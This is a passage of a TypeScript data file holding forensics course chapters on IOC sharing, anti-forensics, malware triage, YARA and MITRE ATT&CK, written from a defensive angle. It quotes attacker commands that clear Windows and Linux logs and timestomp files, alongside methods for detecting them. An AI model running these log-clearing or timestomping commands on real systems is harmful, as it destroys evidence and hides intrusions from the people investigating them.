          'IOC types: file hashes (MD5, SHA-256), IP addresses, domain names, URLs, email addresses, registry keys, mutex names, YARA signatures, and behavioral indicators (TTPs) — structured using STIX (Structured Threat Information eXpression) format',
          'IOC extraction sources: memory dumps (C2 addresses, malware hashes), disk images (malware files, persistence artifacts), network captures (C2 domains, exfiltration endpoints), and log files (attacker IP addresses, compromised accounts)',
          'Threat intelligence sharing: share IOCs with ISACs (Information Sharing and Analysis Centers), via TAXII (Trusted Automated eXchange of Intelligence Information) feeds, and through platforms like MISP (Malware Information Sharing Platform)',
          'Post-incident timeline: construct a comprehensive timeline of the attack from initial access to discovery — correlating evidence from all sources (logs, disk, memory, network) to tell the complete story',
          'Lessons learned: conduct a blameless post-mortem within 1-2 weeks — document root cause, detection gaps, response effectiveness, and specific remediation actions with owners and deadlines',
        ],
        tradeoffs: [
          'Sharing IOCs helps the community defend against the same threat but may reveal information about your organization\'s vulnerabilities or the investigation\'s progress — anonymization and TLP (Traffic Light Protocol) marking help manage this',
          'Atomic IOCs (hashes, IPs) are easy to share but easy for attackers to change — behavioral IOCs (TTPs mapped to MITRE ATT&CK) are more durable but harder to operationalize in automated detection',
          'Post-incident reports must be thorough enough to drive improvement but concise enough that leadership reads and acts on them — executive summaries with technical appendices are the standard format',
        ],
        realWorld: [
          'MISP (Malware Information Sharing Platform): open-source threat intelligence platform for collecting, storing, distributing, and sharing IOCs — used by CERTs, SOCs, and ISACs worldwide',
          'OpenIOC (Mandiant): an open framework for describing technical characteristics of threats — IOC definitions can be used with endpoint scanning tools like YARA and Redline',
          'The FireEye/Mandiant APT1 report: a landmark example of post-incident threat intelligence — detailed IOCs, infrastructure mapping, and TTP analysis attributed attacks to a specific PLA unit',
          'After the SolarWinds/SUNBURST compromise, CISA published Emergency Directive 21-01 with detailed IOCs and detection guidance — demonstrating government-level IOC sharing at scale',
        ],
      },
    ],
  },
  {
    id: 12,
    title: 'Anti-Forensics & Detection',
    part: 4,
    partTitle: 'Advanced Topics',
    summary:
      'Understanding the techniques that adversaries use to destroy, hide, or manipulate evidence, and the forensic methods for detecting these anti-forensic activities.',
    concepts: [
      {
        id: '12-1',
        name: 'Timestomping & Log Manipulation',
        description:
          'Techniques used by attackers to modify file timestamps and alter or destroy log files to confuse forensic timelines and hide their activities.',
        keyPoints: [
          'Timestomping: modifying file timestamps (created, modified, accessed) using tools like timestomp (Metasploit), SetMACE, or PowerShell\'s Set-ItemProperty — makes malicious files appear to have been on the system since installation',
          'NTFS timestamp detection: NTFS stores timestamps in both the $STANDARD_INFORMATION (easily modified) and $FILE_NAME (harder to modify) attributes — discrepancies between the two indicate timestomping',
          'Log clearing: attackers clear Windows Event Logs (wevtutil cl Security), delete Linux log files (rm /var/log/auth.log), or truncate logs — Event ID 1102 (Security log cleared) and Event ID 104 (System log cleared) record the clearing action itself',
          'Selective log manipulation: more sophisticated than clearing, attackers edit specific log entries to remove evidence of their activity while leaving other entries intact — detectable through log sequence gaps (missing Event Record IDs) and inconsistent timestamps',
          'Log forwarding as defense: centralized logging (syslog to SIEM, Windows Event Forwarding) ensures that even if local logs are destroyed, copies exist on the log aggregation server that the attacker may not have compromised',
        ],
        tradeoffs: [
          'Timestomping detection requires comparing $STANDARD_INFORMATION and $FILE_NAME timestamps — this analysis is straightforward with proper tools (MFTECmd) but adds time to every investigation',
          'Centralized logging protects against log destruction but introduces a high-value target — if the attacker compromises the SIEM or log server, all evidence is at risk',
          'Detecting selective log manipulation requires baseline knowledge of expected log volume and patterns — without a baseline, gaps in logs may go unnoticed',
        ],
        realWorld: [
          'The timestomp module in Metasploit Framework is commonly used by penetration testers and attackers to modify MACE timestamps on Windows files — "timestomp secret.exe -z \'01/01/2020 00:00:00\'"',
          'Eric Zimmerman\'s MFTECmd outputs both $SI and $FN timestamps in its CSV output — analysts routinely filter for entries where $SI timestamps predate $FN timestamps (a physical impossibility indicating timestomping)',
          'APT groups including APT28 (Fancy Bear) have been documented using timestomping as a standard operational procedure to blend their tools with legitimate system files',
          'The ELK Stack (Elasticsearch, Logstash, Kibana) with immutable indices provides tamper-resistant centralized logging — events cannot be modified after indexing',
        ],
      },
      {
        id: '12-2',
        name: 'Data Destruction & Secure Wiping',
        description:
          'Methods used to permanently destroy data beyond forensic recovery, and the techniques investigators use to detect that wiping has occurred.',
        keyPoints: [
          'Secure deletion tools: SDelete (Sysinternals), shred (Linux), Eraser (Windows) — overwrite file data with random bytes or zeros, making recovery impossible; the DoD 5220.22-M standard specifies three overwrite passes',
          'Full disk wiping: DBAN (Darik\'s Boot and Nuke), nwipe — boot from external media and overwrite every sector of the drive; used for decommissioning and (by criminals) evidence destruction',
          'SSD considerations: SSD wear leveling and over-provisioning mean that standard overwrite tools may not reach all data copies — the ATA Secure Erase command instructs the SSD controller to reset all flash cells, which is more reliable',
          'Detecting wiping: patterns of zero-filled or random-filled sectors in unallocated space indicate wiping; the presence of secure deletion tools in Prefetch/ShimCache/AmCache proves they were executed; file system timestamps may show mass deletion events',
          'Anti-forensic tools: BleachBit, CCleaner, Privacy Eraser — target browser history, temporary files, logs, and other common forensic artifacts; their presence and configuration reveal what the user attempted to hide',
        ],
        tradeoffs: [
          'On traditional HDDs, a single overwrite pass is sufficient to prevent recovery with any known technique — the common belief that multiple passes are needed is based on outdated research about older drive technology',
          'SSD TRIM complicates both forensic recovery and secure wiping — TRIM may leave data accessible in over-provisioned areas, but it also helps the attacker by zeroing out "deleted" blocks',
          'Detecting that wiping occurred may be as valuable as recovering the wiped data — proving intent to destroy evidence is itself significant in legal proceedings (spoliation)',
        ],
        realWorld: [
          'In the Hillary Clinton email investigation, BleachBit was reportedly used to delete emails — the use of a secure deletion tool became a significant point of public and legal discussion about intent',
          'SDelete (Sysinternals) is frequently found in attacker toolkits — its execution is recorded in Prefetch files, providing evidence that the attacker attempted to securely delete files',
          'The Gutmann method (35-pass overwrite) is widely cited but the author himself has stated it is obsolete for modern drives — NIST SP 800-88 recommends a single overwrite pass for magnetic media and cryptographic erase for SSDs',
          'In corporate litigation, evidence of running CCleaner or similar tools after a litigation hold has been issued constitutes spoliation of evidence — courts have imposed severe sanctions including adverse inference instructions',
        ],
      },
      {
        id: '12-3',
        name: 'Steganography & Encrypted Volume Detection',
        description:
          'Techniques for hiding data within other files (steganography) or in encrypted containers, and the forensic methods for detecting these concealment techniques.',
        keyPoints: [
          'Steganography basics: hiding data within images (LSB — Least Significant Bit modification), audio files, video frames, or document metadata — the carrier file appears normal to casual inspection',
          'Steganalysis techniques: statistical analysis detects deviations from expected file properties — chi-square analysis detects LSB embedding in images, and file size anomalies (an image that is significantly larger than its visual content warrants) indicate hidden data',
          'Encrypted volumes: TrueCrypt/VeraCrypt hidden volumes, LUKS encrypted partitions, and BitLocker volumes — the presence of encrypted containers on a suspect\'s system raises forensic questions about their contents',
          'Detecting encrypted containers: high-entropy data blocks with no recognizable file structure indicate encryption; VeraCrypt volumes have no distinctive header (by design); tools like TCHunt and EnCase Entropy Analysis identify suspected encrypted regions',
          'Plausible deniability: VeraCrypt\'s hidden volume feature creates a second encrypted volume within the free space of the outer volume — revealing the outer volume\'s password does not reveal or prove the existence of the hidden volume',
        ],
        tradeoffs: [
          'Steganography with low embedding rates (hiding very little data in a large carrier) is extremely difficult to detect — the statistical deviation from normal is too small for reliable detection',
          'Encrypted volume detection can identify that encryption exists but cannot determine contents without the key — legal frameworks differ on whether a suspect can be compelled to provide decryption keys (Fifth Amendment in the US)',
          'Steganalysis tools produce false positives (normal images with unusual statistical properties) and false negatives (well-implemented steganography) — results should be treated as indicators, not proof',
        ],
        realWorld: [
          'StegDetect and StegExpose: automated steganalysis tools that analyze images for signs of steganographic embedding — used in law enforcement investigations involving suspected covert communication',
          'In terrorism investigations, steganography has been used to hide communications in images posted to public websites — detection required comparing downloaded images against known clean originals',
          'The VeraCrypt/TrueCrypt hidden volume feature has been central to legal debates about compelled decryption — courts have reached different conclusions about whether revealing an outer volume satisfies a decryption order',
          'OpenStego and Steghide: open-source steganography tools commonly encountered in forensic investigations — understanding their embedding methods aids in detection and extraction',
        ],
      },
    ],
  },
  {
    id: 13,
    title: 'Malware Forensics & Threat Intel',
    part: 4,
    partTitle: 'Advanced Topics',
    summary:
      'Analyzing malicious software to understand its capabilities and origin, using signature and behavioral detection methods, and mapping attacker techniques to threat intelligence frameworks.',
    concepts: [
      {
        id: '13-1',
        name: 'Malware Triage & Sandbox Analysis',
        description:
          'The initial assessment and dynamic analysis of suspicious files in controlled environments to determine their nature, capabilities, and associated indicators of compromise.',
        keyPoints: [
          'Static triage: examine file properties without execution — file hash lookup (VirusTotal), strings extraction (FLOSS by Mandiant for obfuscated strings), PE header analysis (imports, sections, compile timestamp), and packer detection (Detect It Easy, PEiD)',
          'Dynamic analysis (sandboxing): execute the malware in a controlled virtual environment and observe its behavior — file system changes, registry modifications, network connections, process creation, and API calls',
          'Sandbox platforms: Cuckoo Sandbox (open-source, on-premise), ANY.RUN (interactive cloud sandbox), Joe Sandbox (commercial), and Hybrid Analysis (free cloud analysis) — each provides automated reports of observed behavior',
          'Sandbox evasion: sophisticated malware detects virtual environments (VM artifacts, sandbox timing) and alters its behavior — techniques include checking for VM-specific registry keys, hardware identifiers, user interaction, and sleep-based timing checks',
          'Triage output: file hashes (IOCs), extracted C2 addresses, dropped files, YARA rule matches, and a behavioral summary — this feeds into the broader incident investigation and threat intelligence',
        ],
        tradeoffs: [
          'Sandbox analysis reveals runtime behavior but environment-aware malware may behave differently in a sandbox than on a real system — advanced malware requires bare-metal analysis or anti-evasion-configured sandboxes',
          'Cloud sandbox services (VirusTotal, ANY.RUN) are convenient but uploading sensitive malware samples may expose proprietary information or alert the attacker that their malware has been discovered',
          'Static analysis is safe (no execution risk) but misses runtime behavior, especially for packed/encrypted malware that only reveals its payload during execution',
        ],
        realWorld: [
          'VirusTotal: the dominant malware analysis platform — accepts file uploads and provides multi-engine AV scan results, sandbox reports, YARA matches, and community intelligence',
          'FLOSS (FireEye Labs Obfuscated String Solver) by Mandiant: automatically extracts obfuscated strings from malware — reveals hardcoded C2 addresses, encryption keys, and configuration data that basic "strings" misses',
          'In the WannaCry ransomware analysis (2017), sandbox analysis revealed the kill switch domain check — Marcus Hutchins registered the domain to halt the spread, demonstrating the value of rapid dynamic analysis',
          'Cuckoo Sandbox is widely used by CERTs and SOCs for automated malware triage — its modular architecture supports custom analysis modules and reporting formats',
        ],
      },
      {
        id: '13-2',
        name: 'YARA Rules & Signature-Based Detection',
        description:
          'Writing and using YARA rules to identify and classify malware based on textual or binary patterns — the primary method for scalable malware detection in forensic investigations.',
        keyPoints: [
          'YARA rule structure: rule name, metadata (author, description, date), strings (text, hex, regex patterns), and condition (logical expression combining string matches, file properties, and counts)',
          'String types: text strings ("this exact text"), hex patterns ({6A 40 68 00 30 00 00} — shellcode byte sequences), and regular expressions (/[a-z]{5,10}\\.exe/) — combined with modifiers like "nocase", "wide", "ascii", and "fullword"',
          'Conditions: boolean logic (any of ($s*), 2 of ($a, $b, $c)), file properties (filesize, entrypoint), and module functions (pe.imphash(), math.entropy()) — conditions control when the rule triggers',
          'YARA scanning in forensic workflows: scan disk images, memory dumps, network captures, and file systems for known malware indicators — tools like yara, yarascan (Volatility), and YARA-integrated platforms (THOR, Loki) automate this',
          'Rule quality: effective YARA rules minimize false positives and false negatives — over-broad rules (matching common strings) generate noise; over-specific rules (matching exact file hashes) miss variants',
        ],
        tradeoffs: [
          'YARA excels at detecting known malware and variants but cannot detect truly novel malware — behavioral detection (sandbox analysis, EDR) complements signature-based detection',
          'Community YARA rules (YARA-Rules repository, Florian Roth\'s signature-base) provide broad coverage but may not cover targeted malware specific to your organization — custom rules are essential',
          'YARA performance degrades with very large rule sets scanning large data volumes — rule optimization (anchoring conditions, using private rules for common sub-patterns) is important at scale',
        ],
        realWorld: [
          'Florian Roth\'s signature-base: the largest public collection of YARA rules — includes rules for APT malware, hack tools, webshells, and exploit kits; used as a baseline by many SOCs',
          'THOR and Loki (Nextron Systems): YARA-powered endpoint scanners designed for incident response — scan systems for IOCs using curated YARA rules, filename patterns, and hash databases',
          'In APT investigations, custom YARA rules written from malware samples found in the investigation are used to scan the entire enterprise for additional compromised systems — this is a standard lateral movement detection technique',
          'VirusTotal Intelligence allows hunting with YARA rules across all submitted samples — security researchers and threat analysts use this to discover new malware variants and track threat actor campaigns',
        ],
      },
      {
        id: '13-3',
        name: 'MITRE ATT&CK Mapping & Threat Intelligence',
        description:
          'Using the MITRE ATT&CK framework to categorize attacker techniques and integrating threat intelligence to contextualize forensic findings within the broader threat landscape.',
        keyPoints: [
          'MITRE ATT&CK matrix: a structured knowledge base of adversary tactics (the "why" — e.g., Initial Access, Persistence, Lateral Movement) and techniques (the "how" — e.g., T1566 Phishing, T1053 Scheduled Task, T1021 Remote Services)',
          'ATT&CK mapping in investigations: map each observed attacker action to a technique ID — this provides a common language for describing the attack, identifies gaps in detection, and enables comparison with known threat actor profiles',
          'Threat actor profiles (Groups): MITRE catalogs known threat groups (APT28, APT29, Lazarus Group, FIN7) with their commonly used techniques — mapping investigation findings against these profiles aids attribution',
          'ATT&CK-based detection engineering: each technique includes detection recommendations — use these to build SIEM detection rules, EDR policies, and YARA signatures that target specific adversary behaviors',
          'Threat intelligence platforms (TIPs): MISP, OpenCTI, ThreatConnect, and Recorded Future aggregate and correlate IOCs, TTPs, and threat actor intelligence — enabling forensic investigators to quickly contextualize their findings',
        ],
        tradeoffs: [
          'ATT&CK mapping adds analytical rigor and enables cross-incident correlation but requires significant expertise to map accurately — incorrect mapping can lead to flawed attribution and detection gaps',
          'Threat intelligence is most valuable when operationalized (integrated into SIEM rules, EDR policies, and forensic workflows) — intelligence that sits unread in a TIP provides no defensive value',
          'Attribution is valuable for understanding the threat but is extremely difficult to do with high confidence — even ATT&CK-based technique mapping can only suggest likely threat actors, not definitively identify them',
        ],
        realWorld: [
          'ATT&CK Navigator: a web-based tool for annotating and visualizing the ATT&CK matrix — investigators use it to create heat maps showing which techniques were observed in an incident and identify detection gaps',
          'The MITRE Engenuity ATT&CK Evaluations test EDR products against real-world adversary emulations (APT29, Carbanak/FIN7) — results help organizations understand how well their tools detect specific techniques',
          'OpenCTI: open-source threat intelligence platform that natively integrates STIX 2.1 and MITRE ATT&CK — enables forensic teams to store investigation findings as structured threat intelligence',
          'In the SolarWinds/SUNBURST investigation, MITRE ATT&CK was used to map the full kill chain from initial supply chain compromise (T1195.002) through C2 (T1071.001) to data exfiltration — this mapping was shared across the cybersecurity community for collective defense',
        ],
      },
    ],
  },
];

export const chapters: Chapter[] = topics;

export function getChapter(id: number): Chapter | undefined {
  return chapters.find((ch) => ch.id === id);
}
